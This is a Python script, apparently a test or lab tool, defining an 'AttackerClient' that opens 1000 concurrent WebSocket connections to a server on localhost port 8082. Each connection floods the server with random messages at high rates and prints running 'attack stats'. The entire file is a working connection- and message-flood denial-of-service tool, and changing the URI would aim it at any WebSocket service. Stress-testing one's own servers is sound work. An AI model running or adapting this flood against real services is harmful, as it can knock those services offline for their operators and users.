#!/usr/bin/env python3
import asyncio
import websockets
import time
from datetime import datetime
import random
import string

class AttackerClient:
    def __init__(self, num_connections=1000, messages_per_second=50):
        self.num_connections = num_connections
        self.messages_per_second = messages_per_second
        self.active_connections = []
        self.total_messages_sent = 0
        self.start_time = None
        self.uri = "ws://localhost:8082"
        
    def generate_random_message(self, length=100):
        chars = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(chars) for _ in range(length))
    
    async def single_connection_worker(self, connection_id):
        message_count = 0
        
        try:
            async with websockets.connect(self.uri) as websocket:
                base_interval = 1.0 / self.messages_per_second
                jitter = random.uniform(0.8, 1.2)
                send_interval = base_interval * jitter
                
                while True:
                    message_count += 1
                    
                    message = f"Conn#{connection_id}-Msg#{message_count}: {self.generate_random_message()}"
                    
                    try:
                        await websocket.send(message)
                        self.total_messages_sent += 1
                        
                        if random.random() < 0.1:
                            try:
                                response = await asyncio.wait_for(websocket.recv(), timeout=0.1)
                            except:
                                pass
                        
                    except websockets.exceptions.ConnectionClosed:
                        break
                    except Exception:
                        break
                    await asyncio.sleep(send_interval)
                    
        except Exception:
            pass
    
    async def stats_reporter(self):
        while True:
            await asyncio.sleep(5)
            
            if self.start_time:
                elapsed = time.time() - self.start_time
                total_rate = self.total_messages_sent / elapsed if elapsed > 0 else 0
                active_count = len([task for task in self.active_connections if not task.done()])
                
                print(f"\n=== ATTACK STATS ===")
                print(f"Active connections: {active_count}/{self.num_connections}")
                print(f"Total messages sent: {self.total_messages_sent}")
                print(f"Elapsed time: {elapsed:.1f}s")
                print(f"Overall message rate: {total_rate:.1f} msg/s")
                print(f"Target rate per connection: {self.messages_per_second} msg/s")
                print(f"Target overall rate: {self.num_connections * self.messages_per_second} msg/s")
                print(f"===================\n")
    
    async def run_attack(self):
        print(f"Starting attack: {self.num_connections} connections, {self.messages_per_second} msg/s each")
        
        self.start_time = time.time()
        
        for i in range(self.num_connections):
            task = asyncio.create_task(self.single_connection_worker(i + 1))
            self.active_connections.append(task)
            if i % 100 == 0:
                await asyncio.sleep(0.01)
        
        print(f"All connections initiated")
        
        stats_task = asyncio.create_task(self.stats_reporter())
        
        try:
            await asyncio.gather(*self.active_connections, stats_task)
        except KeyboardInterrupt:
            print("\nAttack stopped by user")
        except Exception as e:
            print(f"Attack error: {e}")
        
        if self.start_time:
            total_elapsed = time.time() - self.start_time
            final_rate = self.total_messages_sent / total_elapsed if total_elapsed > 0 else 0
            print(f"\n=== FINAL ATTACK STATS ===")
            print(f"Total messages sent: {self.total_messages_sent}")
            print(f"Total attack duration: {total_elapsed:.1f}s")
            print(f"Average message rate: {final_rate:.1f} msg/s")
            print(f"========================\n")

async def main():
    attacker = AttackerClient(
        num_connections=1000,
        messages_per_second=500
    )
    await attacker.run_attack()

if __name__ == "__main__":
    asyncio.run(main())
